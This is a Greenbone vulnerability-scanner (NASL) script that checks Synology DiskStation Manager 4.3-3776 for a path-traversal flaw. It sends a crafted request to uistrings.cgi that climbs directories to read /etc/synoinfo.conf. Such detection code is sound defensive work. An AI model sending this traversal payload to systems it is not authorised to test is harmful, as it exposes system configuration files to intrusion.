# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:synology:diskstation_manager";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103787");
  script_version("2024-03-15T05:06:15+0000");
  script_tag(name:"cvss_base", value:"9.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"2024-03-15 05:06:15 +0000 (Fri, 15 Mar 2024)");
  script_tag(name:"creation_date", value:"2013-09-12 11:33:59 +0200 (Thu, 12 Sep 2013)");
  script_name("Synology DiskStation Manager (DSM) 4.3-3776 XSS / File Disclosure / Command Injection Vulnerabilities - Active Check");
  script_category(ACT_ATTACK);
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("gb_synology_dsm_consolidation.nasl");
  script_require_ports("Services/www", 5000);
  script_mandatory_keys("synology/dsm/http/detected");

  script_xref(name:"URL", value:"http://packetstormsecurity.com/files/123182/Synology-DSM-4.3-3776-XSS-File-Disclosure-Command-Injection.html");

  script_tag(name:"summary", value:"Synology DiskStation Manager (DSM) is prone to multiple
  vulnerabilities.");

  script_tag(name:"vuldetect", value:"Tries to read /etc/synoinfo.conf by sending a special crafted
  HTTP GET request.");

  script_tag(name:"insight", value:"Synology DSM suffer from remote file download, content
  disclosure, cross-site scripting (XSS) and command injection vulnerabilities.");

  script_tag(name:"impact", value:"Please see the references for details about the impact.");

  script_tag(name:"affected", value:"Synology DSM versions 4.3-3776 and prior.");

  script_tag(name:"solution", value:"Vendor updates are available.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

url = "/scripts/uistrings.cgi?lang=." + crap( data:"/", length:88 ) + crap( data:"../", length:3*5 ) + "etc/synoinfo.conf";

if( http_vuln_check( port:port, url:url, pattern:"secure_admin_port" ) ) {
  report = http_report_vuln_url( port:port, url:url );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );
